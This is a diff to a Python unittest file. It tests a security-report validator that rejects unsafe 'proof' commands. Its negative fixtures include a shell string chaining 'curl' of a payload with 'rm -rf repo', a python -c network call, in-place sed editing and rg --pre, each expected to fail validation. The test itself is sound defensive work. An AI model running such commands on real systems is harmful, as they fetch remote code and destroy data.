@@ -2093,7 +2093,16 @@ class CliWorkflowTests(unittest.TestCase):
         self.assertEqual("SEC-001", proofs["proofs"][0]["finding_id"])
         self.assertIs(proofs["proofs"][0]["safe_by_design"], True)
         self.assertEqual(["reports/proofs/SEC-001-test-plan.md"], proofs["proofs"][0]["files_created"])
-        self.assertIn("Local/private by default", (run_dir / "reports" / "PROOFS.md").read_text(encoding="utf-8"))
+        command_names = [command["argv"][0] for command in proofs["proofs"][0]["commands_run"]]
+        self.assertEqual(["rg", "sed", "python3"], command_names)
+        self.assertTrue(all(command["read_only"] is True for command in proofs["proofs"][0]["commands_run"]))
+        self.assertTrue(all(command["writes"] == [] for command in proofs["proofs"][0]["commands_run"]))
+        self.assertTrue(all(command["network"] is False for command in proofs["proofs"][0]["commands_run"]))
+        self.assertTrue(all(command["requires_credentials"] is False for command in proofs["proofs"][0]["commands_run"]))
+        proofs_md = (run_dir / "reports" / "PROOFS.md").read_text(encoding="utf-8")
+        self.assertIn("Local/private by default", proofs_md)
+        self.assertIn("Commands for PROOF-001:", proofs_md)
+        self.assertIn("`rg --line-number SEC-001 repo/app.py`", proofs_md)
         self.assertTrue((run_dir / "reports" / "proofs" / "SEC-001-test-plan.md").exists())
 
         final_path = run_dir / "codex-safe-proof-sec-001-final.md"
@@ -3103,7 +3112,7 @@ class CliWorkflowTests(unittest.TestCase):
         invalid["proofs"][0]["proof_type"] = "exploit-script"
         invalid["proofs"][0]["safe_by_design"] = False
         invalid["proofs"][0]["files_created"] = ["reports/proofs/../../repo/exploit.py"]
-        invalid["proofs"][0]["commands_run"] = ["curl https://example.com/payload"]
+        invalid["proofs"][0]["commands_run"] = ["curl https://example.com/payload; rm -rf repo"]
         (invalid_run / "reports" / "proofs.json").write_text(json.dumps(invalid, indent=2) + "\n", encoding="utf-8")
 
         cp_invalid = self.run_cmd([REPO_ROOT / "bin" / "gra-validate-report", "--run", invalid_run])
@@ -3112,7 +3121,55 @@ class CliWorkflowTests(unittest.TestCase):
         self.assertIn("invalid proof type", cp_invalid.stderr)
         self.assertIn("safe_by_design", cp_invalid.stderr)
         self.assertIn("proof artifact path must not contain '..'", cp_invalid.stderr)
-        self.assertIn("command appears unsafe", cp_invalid.stderr)
+        self.assertIn("free-form shell strings are not accepted", cp_invalid.stderr)
+        self.assertIn("shell metacharacters", cp_invalid.stderr)
+
+        unsafe_structured_run = self.copy_fixture_run("minimal-run")
+        unsafe_structured = json.loads((FIXTURES / "proof-output" / "reports" / "proofs.json").read_text(encoding="utf-8"))
+        unsafe_structured["proofs"][0]["commands_run"] = [
+            {
+                "argv": ["python3", "-c", "import urllib.request; urllib.request.urlopen('https://example.com')"],
+                "read_only": False,
+                "writes": ["repo/output.txt"],
+                "network": True,
+                "requires_credentials": True,
+                "cwd_scope": "external",
+            },
+            {
+                "argv": ["sed", "-i", "s/a/b/", "repo/app.py"],
+                "read_only": True,
+                "writes": [],
+                "network": False,
+                "requires_credentials": False,
+                "cwd_scope": "target_repo",
+            },
+            {
+                "argv": ["rg", "--pre", "cat", "SEC-001", "repo/app.py"],
+                "read_only": True,
+                "writes": [],
+                "network": False,
+                "requires_credentials": False,
+                "cwd_scope": "target_repo",
+            },
+        ]
+        (unsafe_structured_run / "reports" / "proofs.json").write_text(
+            json.dumps(unsafe_structured, indent=2) + "\n",
+            encoding="utf-8",
+        )
+
+        cp_unsafe_structured = self.run_cmd(
+            [REPO_ROOT / "bin" / "gra-validate-report", "--run", unsafe_structured_run]
+        )
+        self.assertNotEqual(cp_unsafe_structured.returncode, 0)
+        self.assertIn("read_only: must be true", cp_unsafe_structured.stderr)
+        self.assertIn("writes: read-only proof commands must declare no writes", cp_unsafe_structured.stderr)
+        self.assertIn("network: must be false", cp_unsafe_structured.stderr)
+        self.assertIn("requires_credentials: must be false", cp_unsafe_structured.stderr)
+        self.assertIn("cwd_scope: must be one of", cp_unsafe_structured.stderr)
+        self.assertIn("python proof commands are limited to read-only JSON inspection", cp_unsafe_structured.stderr)
+        self.assertIn("python -c is not allowed", cp_unsafe_structured.stderr)
+        self.assertIn("sed in-place editing is not allowed", cp_unsafe_structured.stderr)
+        self.assertIn("rg --pre/--pre-glob is not allowed", cp_unsafe_structured.stderr)
 
         wrong_type_run = self.copy_fixture_run("minimal-run")
         (wrong_type_run / "reports" / "proofs.json").write_text("[]\n", encoding="utf-8")
